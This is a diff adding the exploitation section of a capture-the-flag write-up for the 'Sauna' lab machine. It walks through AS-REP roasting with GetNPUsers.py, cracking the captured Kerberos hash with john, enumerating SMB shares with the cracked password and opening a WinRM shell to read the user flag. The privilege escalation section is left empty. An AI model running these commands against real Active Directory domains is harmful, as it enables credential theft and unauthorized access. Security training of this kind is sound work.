@@ -134,7 +134,90 @@ Looks like user FSmith does not require pre-authentication.  Now we can send an 
 
 ### Exploitation
 
+The impacket script GetNPUsers.py can be used from a Linux machine in order to harvest the non-preauth AS_REP responses.  We use a file with the username Fsmith  in it and output the password hash in a format that can be cracked by john:
+```
+python /opt/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile docswords.txt -format john -outputfile hashes.txt
+```
+
+<br />
 
 
+Once it is complete, verify that the file contains a password hash for FSmith:
+```
+cat hashes.txt
+
+$krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL:26dce2496172a25278f91a7a33b16d54$fae5ff8764f66858ce4d5ff9825762cfaefdfc191d731011be1b8c77e81286e66861b403b98ffb3714475b0a45cba8cf79ec603514bcc3e3fb3483d3146b12a4125d76698c36f5c9d6c528e7f7215afb48a1cb3e3f8c5f232dc183fd66eb01ca4c6b95daa2be489fabdc4f1763e934307e87c052e5233ac9bd71d0c5c7461b85c9d0928b3fc24b976490d72838695daee5e44700f98aecea24f995666d157c3762d2982a4995260018a40703f6e37168b3723d4e85219e73d03d54f3c3834007d4eea1f943fd87d708d7d58a2ae6407c00ba1bc1eb9cff700aa8bad7d29f8110f36e6ba20ec47a42ac0400c724fa5bd8910222132d5d257d4f4ea83aa5df937d
+```
+
+<br />
+
+Now attempt to crack the password with john:
+```
+john --format:krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt Sauna_hashes.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMA>
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
+1g 0:00:00:14 DONE (2020-02-16 15:18) 0.06944g/s 731875p/s 731875c/s 731875C/s Thrall..Thehunter22
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+<br />
+
+Now we have credentials Fsmith:Thestrokes23.  Let's use these credentials to list shares available on the server:
+```
+smbmap -H 10.10.10.175 -u FSmith -p Thestrokes23
+
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.175...
+[+] IP: 10.10.10.175:445        Name: 10.10.10.175
+        Disk                                                    Permissions
+        ----                                                    -----------
+        ADMIN$                                                  NO ACCESS
+        C$                                                      NO ACCESS
+        IPC$                                                    READ ONLY
+        NETLOGON                                                READ ONLY
+        print$                                                  READ ONLY
+        RICOH Aficio SP 8300DN PCL 6                            NO ACCESS
+        SYSVOL                                                  READ ONLY
+```
+
+<br />
+
+Now list out the content of each of the shares that we have access to:
+```
+smbmap -R print$ -H 10.10.10.175 -u FSmith -p Thestrokes23
+smbmap -R NETLOGON -H 10.10.10.175 -u FSmith -p Thestrokes23
+smbmap -R SYSVOL -H 10.10.10.175 -u FSmith -p Thestrokes23
+```
+
+<br />
+
+I did not find any useful information in the shares, so I tried to access the server with Windows Remote Management (WinRM) on port 5985 using [evil-winrm](https://github.com/Hackplayers/evil-winrm):
+```
+ruby evil-winrm.rb -i 10.10.10.175 -u FSmith -p Thestrokes23
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+Evil-WinRM PS C:\Users\FSmith\Documents> 
+```
+
+Grab the user.txt file:
+```
+PS C:\Users\FSmith\Documents> cat ..\Desktop\user.txt
+
+1b5520b98d97cf17f24122a55baf70cf
+```
+
+<br />
+
+### Privilege Escalation 
+
+<br />
 
 
